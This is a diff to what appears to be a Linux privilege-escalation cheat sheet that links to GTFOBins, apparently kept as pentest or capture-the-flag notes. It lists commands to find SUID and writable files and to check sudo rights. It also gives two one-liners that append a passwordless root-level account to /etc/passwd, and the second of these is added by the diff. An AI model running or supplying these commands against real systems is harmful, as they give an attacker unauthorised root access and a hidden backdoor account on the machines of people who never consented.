@@ -1,6 +1,8 @@
 [gtfobins](https://gtfobins.github.io/)
 - __Finding SUID__
   - __`find / -perm -4000 2>/dev/null`__
+  
+- __`find / -writable -type f 2>/dev/null`__
 
 - __`sudo -l`__
   - __If you see this output `(root) NOPASSWD:/usr/bin/find`__
@@ -17,6 +19,7 @@
 
 - __creating a new user__
   - __`echo "newRoot::0:0:newRoot:/home/newRoot:/bin/sh" >> /etc/passwd`__
+  - __`echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd`__
  
 
 - ## Privilege escalation <a name="privilegeescalation"></a>
